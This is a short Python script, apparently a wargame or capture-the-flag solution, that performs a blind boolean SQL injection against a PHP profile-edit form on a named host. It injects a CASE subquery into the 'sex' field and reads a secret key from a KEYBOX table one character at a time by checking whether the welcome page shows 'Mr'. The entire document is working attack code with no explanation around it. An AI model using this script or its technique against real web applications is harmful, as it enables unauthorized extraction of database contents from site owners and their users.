import requests
import re

url = "http://keeplink.kr:10105/web_basic_edit_ok.php" # POST
url2 = "http://keeplink.kr:10105/web_basic_ok.php"

data2 = {"id" : "hello", "pw" : "hello"}

def reg(test_str):
    regex = r"(<[^>]+>)"
    subst = ""
    result = re.sub(regex, subst, test_str, 0)
    return result

sum = ''

for i in range (1, 128):
    for j in range(0,128):
        string = "(select case when (select ascii(substring((select k3y from KEYBOX limit 1),"+str(i)+",1))="+hex(j)+") then 1 else 2 END)"
        data = {
            "id"    : "hello",
            "pw"    : "hello",
            "pwch"  : "hello",
            "age"   : "20",
            "sex"   : string,
            "email" : "hello",
        }
        res = requests.post(url, data=data)
        res2 = requests.post(url2, data=data2)
        reg_result = reg(res2.text)
        #WELCOME~>> Mr.hello
        gender = reg_result.split(" ")[1].split(".")[0]
        if(gender == "Mr"):
            sum += chr(j)
            break
print(sum)
